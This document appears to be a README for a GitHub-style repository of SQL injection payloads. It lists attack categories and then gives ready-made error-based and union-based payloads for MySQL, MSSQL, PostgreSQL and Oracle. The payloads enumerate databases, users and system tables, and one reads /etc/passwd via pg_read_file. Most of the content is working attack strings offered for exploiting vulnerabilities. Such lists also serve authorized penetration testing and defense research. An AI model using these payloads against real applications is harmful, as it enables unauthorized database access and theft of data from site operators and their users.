# SQL Injection Payloads Repository

Welcome to the **SQL Injection Payloads Repository** — a comprehensive collection of SQLi payloads designed for security researchers, penetration testers, and bug bounty hunters. This repository aims to provide an extensive range of payloads for various SQL injection techniques to help identify and exploit vulnerabilities effectively.

## 🚀 What is SQL Injection?
SQL Injection (SQLi) is a web security vulnerability that allows attackers to manipulate SQL queries by injecting malicious SQL code. It can result in data theft, unauthorized access, or even complete database compromise.

## 📂 Payload Categories
This repository contains payloads for different types of SQL injection attacks:

- **Error-Based SQLi**
- **Union-Based SQLi**
- **Boolean-Based Blind SQLi**
- **Time-Based Blind SQLi**
- **Out-of-Band (OOB) SQLi**
- **Stored Procedure SQLi**
- **Second-Order SQLi**
- **Stacked Queries SQLi**
- **WAF Bypass Techniques**
- **DNS Exfiltration SQLi**
- **Hybrid SQLi Payloads**
- **Comment-Based SQLi**

---

## 📋 Error-Based SQLi Payloads

### MySQL
- `' OR 1=1#`
- `' UNION SELECT 1,@@version#`
- `' UNION SELECT null,@@datadir#`
- `' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE())))#`
- `' AND UPDATEXML(1,CONCAT(0x7e,(SELECT USER())),1)#`
- `' OR 1=1 LIMIT 1#`
- `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#`
- `' UNION SELECT table_name FROM information_schema.tables#`
- `' AND (SELECT COUNT(*) FROM mysql.user)#`
- `' AND EXP(~0)#`

### MSSQL
- `' UNION SELECT @@version--`
- `' UNION SELECT DB_NAME()--`
- `' UNION SELECT CAST(DB_NAME() AS VARCHAR(4000))--`
- `' AND 1=CONVERT(int,(SELECT @@version))--`
- `' AND 1=CONVERT(int,(SELECT SYSTEM_USER))--`
- `' OR 1=CONVERT(int,(SELECT host_name()))--`
- `' UNION SELECT name FROM sys.databases--`
- `' UNION SELECT name FROM master.sys.databases--`
- `' UNION SELECT name FROM sysobjects WHERE xtype='U'--`
- `' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--`

### PostgreSQL
- `' UNION SELECT version();--`
- `' UNION SELECT current_database();--`
- `' AND 1=CAST(version() AS INTEGER)--`
- `' AND 1=CAST(current_database() AS INTEGER)--`
- `' AND 1=CAST(current_user AS INTEGER)--`
- `' UNION SELECT table_name FROM information_schema.tables--`
- `' UNION SELECT table_catalog FROM information_schema.tables--`
- `' UNION SELECT pg_sleep(10)--`
- `' UNION SELECT pg_read_file('/etc/passwd',0,100)--`
- `' AND (SELECT pg_sleep(5))--`

### Oracle
- `' UNION SELECT banner FROM v$version--`
- `' AND 1=(SELECT 1 FROM DUAL WHERE 1=1)--`
- `' UNION SELECT table_name FROM all_tables WHERE ROWNUM=1--`
- `' UNION SELECT sysdate FROM dual--`
- `' AND 1=(SELECT TO_CHAR(SYSDATE, 'YYYY-MM-DD'))--`
- `' UNION SELECT username FROM all_users--`
- `' UNION SELECT table_name FROM all_tables WHERE ROWNUM=1--`
- `' UNION SELECT banner FROM v$version WHERE ROWNUM=1--`
- `' AND (SELECT COUNT(*) FROM dba_users)--`
- `' UNION SELECT user FROM dual--`

---



